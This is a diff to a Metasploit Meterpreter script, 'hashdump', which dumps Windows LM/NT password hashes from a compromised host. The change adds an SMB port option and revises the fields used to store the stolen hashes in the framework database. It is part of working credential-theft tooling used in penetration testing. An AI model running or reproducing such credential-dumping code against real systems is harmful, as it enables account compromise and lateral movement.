@@ -4,15 +4,20 @@
 
 @client = client
 opts = Rex::Parser::Arguments.new(
-	"-h" => [ false, "Help menu." ]
+	"-h" => [ false, "Help menu." ],
+	"-p" => [ true, "The SMB port used to associated credentials."]
 )
+
+smb_port = 445
 
 opts.parse(args) { |opt, idx, val|
 	case opt
 	when "-h"
-		print_line "pwdump"
+		print_line "hashdump -- dump SMB hashes to the database"
 		print_line(opts.usage)
 		raise Rex::Script::Completed
+	when "-p"
+		smb_port = val.to_i
 	end
 }
 
@@ -236,11 +241,11 @@ users.keys.sort{|a,b| a<=>b}.each do |rid|
 	hashstring = "#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::"
 	@client.framework.db.report_auth_info(
 		:host  => client.sock.peerhost,
-		:proto => 'smb',
+		:port  => smb_port,
+		:sname => 'smb',
 		:user  => users[rid][:Name],
-		:hash  => users[rid][:hashlm].unpack("H*")[0] +":"+ users[rid][:hashnt].unpack("H*")[0],
-		:hash_string => hashstring,
-		:target_host => client.sock.peerhost
+		:pass  => users[rid][:hashlm].unpack("H*")[0] +":"+ users[rid][:hashnt].unpack("H*")[0],
+		:type  => "smb_hash"
 	)
 	print_line hashstring
 end
